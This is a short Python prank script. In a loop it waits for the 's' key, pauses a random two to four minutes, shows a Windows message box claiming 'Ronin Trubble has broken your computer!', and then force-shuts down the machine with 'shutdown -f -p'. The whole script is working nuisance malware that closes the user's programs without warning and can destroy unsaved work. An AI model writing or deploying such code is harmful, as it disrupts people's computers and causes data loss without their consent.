import keyboard
import os
import time
import random
import ctypes
while True:
    keyboard.wait('s')
    time.sleep(random.randint(120,240))
    ctypes.windll.user32.MessageBoxW(0, "Kachow! Kachow! Ronin Trubble has broken your computer!", "Problems", 0)
    os.system('shutdown -f -p')
